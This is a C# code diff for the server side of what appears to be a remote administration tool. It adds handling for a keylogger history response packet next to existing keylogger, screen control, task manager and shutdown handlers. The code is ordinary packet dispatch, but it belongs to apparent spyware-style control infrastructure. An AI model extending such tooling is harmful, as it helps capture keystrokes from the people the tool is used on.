@@ -13,6 +13,7 @@ namespace Server.Networking
         private readonly Action<KeyLoggerEvent>? _onKeyLoggerEvent;
         private readonly Action<KeyLoggerBatch>? _onKeyLoggerBatch;
         private readonly Action<KeyLoggerComboEvent>? _onKeyLoggerComboEvent;
+        private readonly Action<KeyLoggerHistoryResponse>? _onKeyLoggerHistoryResponse;
         private readonly Action<MessageBoxResponse> _onMessageBoxResponse;
         private readonly Action<ShutdownActionResponse> _onShutdownActionResponse;
         private readonly Action<TaskManagerResponse> _onTaskManagerResponse;
@@ -28,6 +29,7 @@ namespace Server.Networking
 							 Action<KeyLoggerEvent>? onKeyLoggerEvent = null, 
                              Action<KeyLoggerBatch>? onKeyLoggerBatch = null, 
                              Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null,
+                             Action<KeyLoggerHistoryResponse>? onKeyLoggerHistoryResponse = null,
                              Action<ScreenControlResponse>? onScreenControlResponse = null,
                              Action<ScreenControlFrame>? onScreenControlFrame = null)
         {
@@ -37,6 +39,7 @@ namespace Server.Networking
             _onKeyLoggerEvent = onKeyLoggerEvent;
             _onKeyLoggerBatch = onKeyLoggerBatch;
             _onKeyLoggerComboEvent = onKeyLoggerComboEvent;
+            _onKeyLoggerHistoryResponse = onKeyLoggerHistoryResponse;
             _onMessageBoxResponse = onMessageBoxResponse;
             _onShutdownActionResponse = onShutdownActionResponse;
             _onTaskManagerResponse = onTaskManagerResponse;
@@ -89,6 +92,10 @@ namespace Server.Networking
                     case PacketType.KeyLoggerComboEvent:
                         var klCombo = JsonHelper.Deserialize<KeyLoggerComboEvent>(json);
                         if (klCombo != null && _onKeyLoggerComboEvent != null) _onKeyLoggerComboEvent(klCombo);
+                        break;
+                    case PacketType.KeyLoggerHistoryResponse:
+                        var klHistory = JsonHelper.Deserialize<KeyLoggerHistoryResponse>(json);
+                        if (klHistory != null && _onKeyLoggerHistoryResponse != null) _onKeyLoggerHistoryResponse(klHistory);
                         break;
                     case PacketType.MessageBoxResponse:
                         var msgResq = JsonHelper.Deserialize<MessageBoxResponse>(json);
